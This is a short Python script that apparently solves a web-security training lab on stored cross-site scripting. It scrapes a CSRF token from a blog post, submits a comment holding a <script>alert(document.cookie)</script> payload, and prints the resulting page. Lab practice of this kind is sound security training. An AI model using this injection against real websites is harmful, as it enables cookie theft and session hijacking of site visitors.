import requests
from bs4 import BeautifulSoup


s = requests.Session()
site = '0a9b00db0425f365805f037200ec00d0.web-security-academy.net'
blog_post_url = f'https://{site}/post?postId=1'
resp = s.get(blog_post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

comment_url = f'https://{site}/post/comment'
comment_string = '''<script>alert(document.cookie)</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '1',
    'comment' : comment_string,
    'name' : 'Long',
    'email' : 'lamlon@pdx.edu',
    'website': 'https://pdx.edu'
}
resp = s.post(comment_url, data=comment_data)
resp = s.get(blog_post_url)
print(resp.text)

